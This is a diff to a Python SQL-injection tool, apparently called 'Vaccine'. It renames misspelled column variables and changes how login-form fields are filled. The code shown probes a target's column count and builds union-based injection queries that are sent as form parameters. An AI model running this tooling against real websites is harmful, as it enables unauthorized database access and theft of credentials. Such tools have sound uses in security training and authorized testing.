@@ -66,7 +66,7 @@ class Union:
 
 		self.original_text = self.submit("").text
 
-		self.colum_counts = self.check_num_colums()
+		self.column_counts = self.check_num_colums()
 
 	def check_num_colums(self):
 		for i in range(1, 10):
@@ -75,13 +75,13 @@ class Union:
 			res = self.submit(query)
 			if not res.text.strip().startswith("<!DOCTYPE"):
 				break
-		colum_counts = i - 1
-		print(f"colum counts: {colum_counts}")
-		return colum_counts
+		column_counts = i - 1
+		print(f"column counts: {column_counts}")
+		return column_counts
 
-	def exec_union(self, colum_name, contents):
-		colum_lst = [colum_name] * self.colum_counts
-		colums = ", ".join(colum_lst)
+	def exec_union(self, column_name, contents):
+		column_lst = [column_name] * self.column_counts
+		colums = ", ".join(column_lst)
 		query = self.header + "SELECT " + colums + contents + self.comment
 		print(f"{Style.CYAN}QUERY: {query}{Style.RESET}")
 		res = self.submit(query)
@@ -135,8 +135,8 @@ class Vaccine:
 			self.username_field_name = field[0]
 			self.password_field_name = field[1]
 		else:
-			self.username_field_name = None
-			self.password_field_name = field[0]
+			self.username_field_name = field[0]
+			self.password_field_name = None
 
 	def __str__(self):
 		return f'''[metadata]
@@ -192,15 +192,15 @@ class Vaccine:
 			error_exit(f"{self.url} - {response}")
 		return response.text
 
-	def submit(self, password, username=""):
-		if self.username_field_name:
+	def submit(self, username, password=""):
+		if self.password_field_name:
 			payload = {
 				self.username_field_name: username,
 				self.password_field_name: password
 			}
 		else:
 			payload = {
-				self.password_field_name: password,
+				self.username_field_name: username,
 				"Submit" : "Submit"
 			}
 		res = requests.get(self.request_url, params=payload, cookies=cookies)
